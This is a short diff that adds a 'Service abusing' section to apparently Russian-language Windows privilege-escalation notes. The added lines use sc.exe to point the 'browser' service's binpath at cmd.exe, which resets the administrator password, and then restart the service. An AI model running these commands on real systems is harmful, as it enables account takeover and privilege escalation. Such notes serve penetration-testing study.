@@ -284,6 +284,17 @@ sc.exe query daclsvc - информация о состянии службы (с
 
 services
 
+# Service abusing
+
+sc.exe config browser
+
+binpath="C:\Windows\system32\cmd.exe /c net user administrator Password321123"
+
+sc.exe stop browser
+
+sc.exe start browser
+
+
 
 ------Если есть группа и привелегии по управлению сервисами  --->>>
 
